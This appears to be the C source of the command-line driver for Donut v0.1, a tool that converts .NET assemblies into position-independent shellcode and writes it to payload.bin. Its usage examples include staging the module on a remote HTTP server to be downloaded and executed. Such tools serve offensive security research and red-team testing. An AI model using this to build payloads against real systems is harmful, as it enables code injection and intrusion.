

#include "donut.h"

const char *err2str(int err) {
    static const char *str="N/A";
    
    switch(err) {
      case DONUT_ERROR_SUCCESS:
        str = "No error";
        break;
      case DONUT_ERROR_ASSEMBLY_NOT_FOUND:
        str = "Assembly not found";
        break;
      case DONUT_ERROR_ASSEMBLY_EMPTY:
        str = "Assembly is empty";
        break;
      case DONUT_ERROR_ASSEMBLY_ACCESS:
        str = "Cannot open assembly";
        break;
      case DONUT_ERROR_NO_MEMORY:
        str = "No memory available";
        break;
      case DONUT_ERROR_INVALID_ARCH:
        str = "Invalid architecture specified";
        break;
      case DONUT_ERROR_URL_LENGTH:
        str = "Invalid URL length";
        break;
      case DONUT_ERROR_INVALID_PARAMETER:
        str = "Invalid parameter";
        break;
      case DONUT_ERROR_RANDOM:
        str = "Error generating random values";
        break;
    }
    return str;
}

static char* get_param (int argc, char *argv[], int *i) {
    int n = *i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i = n + 1;
      return argv[n+1];
    }
    printf("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}

static void usage (void) {
    printf("\n  usage: donut [options] -f <.NET assembly> | -u <URL hosting donut module>\n\n");
    
    printf("       -f <path>            .NET assembly to embed in PIC and DLL.\n");
    printf("       -u <URL>             HTTP server hosting the .NET assembly.\n");
    
    printf("       -c <namespace.class> The assembly class name.\n");
    printf("       -m <method>          The assembly method name.\n");
    printf("       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.\n");
    
    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64(default).\n");
    printf("       -r <version>         CLR runtime version. v4.0.30319 is used by default.\n");
    printf("       -d <name>            AppDomain name to create for assembly. Randomly generated by default.\n\n");

    printf(" examples:\n\n");
    printf("    donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n");
    printf("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u http://remote_server.com/modules/\n");
    
    exit (0);
}

int main(int argc, char *argv[]) {
    DONUT_CONFIG c;
    char         opt;
    int          i, err;
    FILE         *fd;
    char         *arch_str[2] = { "x86", "AMD64" };
    char         *inst_type[2]= { "PIC", "URL"   };
    
    printf("\n");
    printf("  [ Donut .NET shellcode generator v0.1\n");
    printf("  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default type is position independent code for AMD64
    c.type = DONUT_INSTANCE_PIC;
    c.arch = DONUT_ARCH_X64;
    
    // parse arguments
    for(i=1; i<argc; i++) {
      // switch?
      if(argv[i][0] != '-' && argv[i][0] != '/') {
        usage();
      }
      opt = argv[i][1];
      
      switch(opt) {
        // target cpu architecture
        case 'a':
          c.arch   = atoi(get_param(argc, argv, &i)) - 1;
          break;
        // name of domain to use
        case 'd':
          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // assembly to use
        case 'f':
          c.file   = get_param(argc, argv, &i);
          break;
        // runtime version to use
        case 'r':
          strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // url of remote assembly
        case 'u': {
          strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
          c.type   = DONUT_INSTANCE_URL;
          break;
        }
        // class
        case 'c':
          c.cls    = get_param(argc, argv, &i);
          break;
        // method
        case 'm':
          c.method = get_param(argc, argv, &i);
          break;
        // parameters to method
        case 'p':
          c.param  = get_param(argc, argv, &i);
          break;
        default:
          usage();
          break;
      }
    }
    
    // no file?
    if(c.file == NULL) {
      printf("  [ no .NET assembly specified.\n");
      usage();
    }
    
    // no class or method?
    if(c.cls == NULL || c.method == NULL) {
      printf("  [ no class or method specified.\n");
      usage();
    }
    
    if(c.arch != DONUT_ARCH_X86 && 
       c.arch != DONUT_ARCH_X64)
    {
      printf("  [ invalid architecture specified.\n");
      usage();
    }
    
    printf("  [ Instance Type : %s\n", inst_type[c.type]);
    printf("  [ .NET Assembly : %s\n", c.file  );
    printf("  [ Class         : %s\n", c.cls   );
    printf("  [ Method        : %s\n", c.method);
    if(c.param != NULL) {
      printf("  [ Parameters    : %s\n", c.param);
    }
    printf("  [ Target CPU    : %s\n", arch_str[c.arch]);

    printf("\n  [ Creating payload...\n");
    
    err = DonutCreate(&c);
    
    if(err != DONUT_ERROR_SUCCESS) {
      printf("  [ Error returned : %i : %s\n", err, err2str(err));
      return 0;
    }
      
    if(c.type == DONUT_INSTANCE_URL) {
      printf("  [ Module name   : %s\n", c.modname);
      printf("  [ Upload to     : %s\n", c.url);
    }
    
    printf("  [ Saving code to \"payload.bin\"\n\n");
    fd = fopen("payload.bin", "wb");
    
    if(fd != NULL) {
      fwrite(c.pic, 1, c.pic_len, fd);
      fclose(fd);
    } else {
      printf("  [ Error accessing file.\n");
    }
    DonutDelete(&c);
    return 0;
}


